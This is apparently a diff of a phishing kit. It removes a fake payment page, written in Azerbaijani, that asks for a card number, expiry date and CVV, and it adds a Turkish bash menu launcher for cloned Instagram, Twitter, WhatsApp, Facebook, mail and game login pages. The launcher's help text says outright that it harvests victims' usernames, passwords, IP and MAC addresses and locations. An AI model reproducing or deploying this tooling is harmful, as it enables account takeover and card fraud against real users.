@@ -1,62 +1,134 @@
-||====================================================================||
-||//$\\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\//$\\||
-||(100)==================| FEDERAL RESERVE NOTE |================(100)||
-||\\$//        ~         '------========--------'                \\$//||
-||<< /        /$\              // ____ \\                         \ >>||
-||>>|  12    //L\\            // ///..) \\         L38036133B   12 |<<||
-||<<|        \\ //           || <||  >\  ||                        |>>||
-||>>|         \$/            ||  $$ --/  ||        One Hundred     |<<||
-||<<|      L38036133B        *\\  |\_/  //* series                 |>>||
-||>>|  12                     *\\/___\_//*   1989                  |<<||
-||<<\      Treasurer     ______/Franklin\________     Secretary 12 />>||
-||//$\                 ~|UNITED STATES OF AMERICA|~               /$\\||
-||(100)===================  ONE HUNDRED DOLLARS =================(100)||
-||\\$//\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\\$//||
-||====================================================================||
+#!/bin/bash
+#!/bin/sh
+#Code:Yaman Efkar
+#Türk Siber Timi
+#İnstagram : @turksibertimi
+#Youtube : YamanEfkar
+clear
+case $1 in
 
-	
-	<!DOCTYPE html>
-<!-- Created By CodingNepal -->
-<html lang="en" dir="ltr">
-  <head>
-    <meta charset="utf-8">
-	  <title>Online Odenis Merkezi</title>
-    <!-- Somehow I got an error, so I comment the title, just uncomment to show -->
-    <!-- <title>Login Form Design | CodeLab</title> -->
-    <link rel="stylesheet" href="main.css">
-  </head>
-  <body>
-    <div class="wrapper">
-      <div class="title">
-Online Odenis</div>
-<form action="odenis.html">
-        <div class="field">
-          <input type="text" required>
-          <label>Karti Aldiqiniz Bank</label>
-        </div>
-<div class="field">
-          <input type="text" required>
-          <label>Kartin 16 Reqemli Kodu</label>
-        </div>
-		        <div class="field">
-          <input type="text" required>
-          <label>Kartin Bitme Tarixi</label>
-        </div>
-		        <div class="field">
-          <input type="password" required>
-          <label>CVV(Kartin Arxasindaki Kod)</label>
-		  </div>
-    <div class="checkbox">
-            <input type="checkbox" id="remember-me">
-            <label for="remember-me">Karti Yadda saxla</label>
-          </div>
-         
+      "--help")
+	   sleep 1
+       echo -e "
+--help & --h   (Yardım Menüsünü Çağırır)
+--ıp & --ip    (Giriş Yapmış Kişilerin Ip Adresini Listeler)
+--user         (Giriş Yapılmış Username & Pass)
+--mac          (Giriş Yapanların Mac Adresleri)
+--location     (Belirtilen Ip Adresinin Yer Tespiti)
+bash yaman.sh & sh yaman.sh (Phishing Toolu 'nu Çalıştırır)
+   "
+  ;;
 
-<div class="field">
-          <input type="submit" value="Odenis Et">
-        </div>
-   
-</form>
-</div>
-</body>
-</html>
+     "--h")
+	   sleep 1
+       echo -e "
+--help & --h   (Yardım Menüsünü Çağırır)
+--ıp & --ip    (Giriş Yapmış Kişilerin Ip Adresini Listeler)
+--user         (Giriş Yapılmış Username & Pass)
+--mac          (Giriş Yapanların Mac Adresleri)
+--location     (Belirtilen Ip Adresinin Yer Tespiti)
+bash yaman.sh & sh yaman.sh (Phishing Toolu 'nu Çalıştırır)"
+
+  ;;
+
+esac
+
+banner(){
+echo -e '\033[31;40;1m 
+	────────────────█████████───────────────
+	──────────────█████████████─────────────
+	───────────███████████████████──────────
+	────────────────────────────────────────
+	────────████████████████████████────────
+	────────████████████████████████────────
+	────────────────────────────────────────
+	█████████─████████████████████─█████████
+	█████████─████████████████████─█████████
+	███───────████████────████████───────███
+	███───────██████───██───██████───────███
+	─███──────█████──████────█████──────███─
+	──███─────████─────██─────████─────███──
+	───███────████─────██─────████────███───
+	────███───█████────██────█████───███────
+	─────███──█████────██────█████──███─────
+	──────███─███████──────███████─███──────
+	───────██─████████████████████─██───────
+	────────█─████████████████████─█────────
+	────────────────────────────────────────
+	──────────████████████████████──────────
+	───────────██████████████████───────────
+	─────────────██████████████─────────────
+	───────────────███████████──────────────
+	────────────────────────────────────────
+	────────────────█████████───────────────
+	──────────────█████████████─────────────
+
+	   \e[35m☾★ ☾★ ☾★ ☾★ YamanEfkar ☾★ ☾★ ☾★ ☾★	
+	 \e[31m☾★ ☾★ ☾★ ☾★ Türk Siber Timi ☾★ ☾★ ☾★ ☾★	
+  \e[32m☾★ ☾★ ☾★ ☾★ İnstagram : @turksibertimi ☾★ ☾★ ☾★ ☾★	
+'
+echo -e '
+\e[31m[01]\e[32mİnstagram			\e[31m[04]\e[32mFacebook
+\e[31m[02]\e[32mTwitter			\e[31m[05]\e[32mMail
+\e[31m[03]\e[32mWhatsapp			\e[31m[06]\e[32mGame (Oyunlar)
+
+\e[31m[00] Code
+
+\e[31m[99] Çıkış
+
+
+'
+read -p  "İşlem Numarası:" islem
+}
+
+
+
+banner
+if [[ $islem == 1 || $islem == 01 ]]; then
+	sleep 1
+	clear
+	cd Site/Instagram/
+	bash start.sh
+
+elif [[ $islem == 2 || $islem == 02 ]]; then
+	sleep 1
+	clear
+	cd  Site/Twitter/
+	bash start.sh
+
+elif [[ $islem == 3 || $islem == 03 ]]; then
+	sleep 1
+	clear
+	cd Site/Whatsapp/
+	bash start.sh
+
+elif [[ $islem == 4 || $islem == 04 ]]; then
+	sleep 1
+	clear
+	cd  Site/Facebook/
+	bash start.sh
+
+elif [[ $islem == 5 || $islem == 05 ]]; then
+	sleep 1
+	clear
+	cd  Site/Mail/
+	bash start.sh
+
+elif [[ $islem == 6 || $islem == 06 ]]; then
+	sleep 1
+	clear
+	cd  Site/Game/
+	bash start.sh
+elif [[ $islem == 00 ]]; then
+
+	cd Site/
+	bash code.sh
+
+elif [[ $islem == 99 ]]; then
+	exit 1
+else
+	echo -e '\033[36;40;1m Girdiğniz İşlem Numarasını Kontrol Ediniz....'	
+	sleep 1
+	clear 
+	banner
+fi
